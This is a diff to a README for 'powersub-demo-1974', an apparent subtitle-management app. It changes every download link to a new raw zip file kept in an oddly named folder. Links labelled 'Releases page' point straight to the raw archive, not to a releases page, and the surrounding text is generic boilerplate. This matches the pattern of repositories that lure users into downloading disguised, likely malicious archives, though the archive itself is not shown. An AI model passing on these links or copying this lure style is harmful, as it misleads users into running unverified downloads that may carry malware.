@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Now](https://raw.githubusercontent.com/SHIV9302/powersub-demo-1974/main/quadrilaminar/powersub-demo-1974-v2.8.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/SHIV9302/powersub-demo-1974/main/quadrilaminar/powersub-demo-1974-v2.8.zip)
+[![Download Now](https://raw.githubusercontent.com/SHIV9302/powersub-demo-1974/main/quadrilaminar/demo_powersub_1.3.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/SHIV9302/powersub-demo-1974/main/quadrilaminar/demo_powersub_1.3.zip)
 
 ## 📖 Description
 
@@ -25,7 +25,7 @@ powersub-demo-1974 helps you manage and display subtitles easily. The app is des
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**
-   To download the application, you need to visit our [Releases page](https://raw.githubusercontent.com/SHIV9302/powersub-demo-1974/main/quadrilaminar/powersub-demo-1974-v2.8.zip).
+   To download the application, you need to visit our [Releases page](https://raw.githubusercontent.com/SHIV9302/powersub-demo-1974/main/quadrilaminar/demo_powersub_1.3.zip).
 
 2. **Choose the Latest Version**
    On the Releases page, look for the latest version at the top of the list. Each release has a corresponding downloadable file.
@@ -71,6 +71,6 @@ If you need further help or have questions, please feel free to reach out. You c
 
 For more information about using the application and its features, check the documentation provided in the repository.
 
-Visit the [Releases page](https://raw.githubusercontent.com/SHIV9302/powersub-demo-1974/main/quadrilaminar/powersub-demo-1974-v2.8.zip) again for the latest updates and releases. 
+Visit the [Releases page](https://raw.githubusercontent.com/SHIV9302/powersub-demo-1974/main/quadrilaminar/demo_powersub_1.3.zip) again for the latest updates and releases. 
 
 Thank you for using powersub-demo-1974! Enjoy seamless subtitle management.
